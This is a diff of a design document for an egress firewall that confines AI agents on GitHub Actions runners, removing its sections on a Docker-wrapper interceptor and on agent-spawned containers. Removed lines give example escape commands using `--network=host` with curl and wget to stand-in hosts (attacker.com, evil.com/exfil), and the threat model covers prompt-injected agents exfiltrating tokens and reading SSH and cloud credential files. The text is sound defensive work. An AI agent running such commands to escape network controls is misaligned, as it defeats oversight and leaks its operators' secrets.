@@ -23,7 +23,6 @@ This firewall solves a specific problem: **egress control for AI agents running 
 - **Full filesystem access**: Agents read and write files freely. If your threat model requires filesystem isolation, you need additional controls.
 - **Localhost communication**: Required for stdio-based MCP servers running alongside the agent.
 - **DNS to trusted servers only**: DNS queries are restricted to configured DNS servers (default: Google DNS). This prevents DNS-based data exfiltration to attacker-controlled DNS servers.
-- **Docker socket access**: The agent can spawn containers—we intercept and constrain them, but the capability exists.
 
 ---
 
@@ -146,25 +145,9 @@ The agent never connects directly to the internet. Even if it explicitly tries t
 
 ---
 
-## The Tricky Bits: Spawned Containers
+## Host DOCKER-USER Chain
 
-The hardest problem we solve is constraining containers the agent spawns dynamically. An agent might run `docker run --network=host alpine curl attacker.com` to escape the firewall network entirely.
-
-We handle this at two levels:
-
-### docker-wrapper.sh
-
-A shell script symlinked at `/usr/bin/docker` inside the agent container (real Docker CLI at `/usr/bin/docker-real`). It intercepts all `docker run` commands and:
-
-1. **Strips dangerous network flags**: `--network=host`, `--net=host`, `--network=bridge`
-2. **Injects `--network=awf-net`**: Forces the container onto our controlled network
-3. **Injects proxy environment variables**: `HTTP_PROXY`, `HTTPS_PROXY` pointing to Squid
-
-The agent and its MCP servers see normal Docker behavior; they don't know their network requests are being rewritten.
-
-### Host DOCKER-USER Chain
-
-Even with docker-wrapper, we don't fully trust it—an agent could theoretically find the real Docker binary or exploit a wrapper bug. The DOCKER-USER chain provides a backstop:
+The host-level DOCKER-USER chain provides a critical security layer for all containers on the awf-net network:
 
 ```bash
 # Simplified rules (actual implementation in src/host-iptables.ts)
@@ -176,11 +159,11 @@ iptables -A FW_WRAPPER -p tcp -d 172.30.0.10 -j ACCEPT             # Traffic to 
 iptables -A FW_WRAPPER -j DROP                                      # Everything else blocked
 ```
 
-Any container on `awf-net`—whether we created it or the agent spawned it—has its egress filtered. Traffic either goes through Squid or gets dropped.
+Any container on `awf-net` has its egress filtered. Traffic either goes through Squid or gets dropped.
 
 ### Why Not a Network Namespace Jail?
 
-We considered isolating the agent in a network namespace with zero external connectivity, proxying everything through a sidecar. This fails for MCP servers that spawn child processes or containers—each would need its own namespace setup. The iptables + proxy approach handles arbitrary process trees transparently.
+We considered isolating the agent in a network namespace with zero external connectivity, proxying everything through a sidecar. This fails for MCP servers that spawn child processes—each would need its own namespace setup. The iptables + proxy approach handles arbitrary process trees transparently.
 
 ### Why Squid Over mitmproxy?
 
@@ -252,11 +235,10 @@ Only enable SSL Bump when you specifically need URL path filtering. For most use
 | **Squid container** | Crashes or hangs | Agent traffic can't reach proxy, connections time out | Fail-secure |
 | **Agent container** | Crashes | No agent traffic to filter | Fail-secure |
 | **Container NAT rules** | Not applied (entrypoint fails) | Agent traffic goes direct, but hits DOCKER-USER DROP | Fail-secure |
-| **Host DOCKER-USER rules** | Removed by attacker with root | Spawned containers bypass proxy | **Fail-open** |
+| **Host DOCKER-USER rules** | Removed by attacker with root | Traffic bypasses proxy | **Fail-open** |
 | **DNS** | Unreachable | Name resolution fails, agent can't connect anywhere | Fail-secure |
-| **docker-wrapper.sh** | Bypassed or buggy | Spawned container tries wrong network, but DOCKER-USER blocks | Fail-secure |
 
-The host iptables rules are our single point of fail-open vulnerability. If an attacker gains root on the runner and clears DOCKER-USER, spawned containers escape filtering. We accept this because:
+The host iptables rules are our single point of fail-open vulnerability. If an attacker gains root on the runner and clears DOCKER-USER, traffic escapes filtering. We accept this because:
 
 1. Root on the runner means the attacker already won (they can read secrets, modify code, etc.)
 2. GitHub Actions runners are ephemeral—rules are reestablished each job
@@ -279,19 +261,6 @@ The agent, processing this issue, executes the command.
 curl: (56) Received HTTP code 403 from proxy after CONNECT
 ```
 Squid logs the attempt with timestamp, source IP, and full URL. The token never leaves the runner.
-
-### Agent Spawns Evasion Container
-
-**Attack:** Agent runs:
-```bash
-docker run --rm --network=host alpine sh -c 'wget -q -O- https://evil.com/exfil?data=...'
-```
-
-**Mitigation:** docker-wrapper.sh intercepts, rewrites to:
-```bash
-docker run --rm --network=awf-net -e HTTP_PROXY=... -e HTTPS_PROXY=... alpine sh -c '...'
-```
-Container joins `awf-net`, egress hits DOCKER-USER, routes through Squid, blocked by ACL.
 
 ### DNS Tunneling
 
@@ -318,8 +287,6 @@ DNS tunneling through the *allowed* DNS servers (encoding data in query names to
 **Filesystem access is unrestricted.** The agent can read `~/.ssh/id_rsa`, `~/.aws/credentials`, environment variables, and any file the runner user can access. If your secrets are on disk, they're accessible. Use GitHub Actions secrets (injected as env vars) and consider what files exist on your runners.
 
 **Non-HTTP protocols are blocked, not filtered.** SSH (port 22), raw TCP, custom protocols—all dropped by iptables. We don't inspect them for allowed destinations. If your agent needs SSH access to specific hosts, you'll need additional rules.
-
-**Docker socket grants significant privilege.** The agent can spawn containers, inspect the Docker daemon, potentially escape to host in some configurations. We mitigate network escape but not Docker escape. For truly untrusted code, consider gVisor or Kata Containers.
 
 **Single-runner scope.** The firewall protects one workflow job on one runner. It doesn't coordinate across parallel jobs or provide organization-wide policy. Each job configures its own allowlist.
 
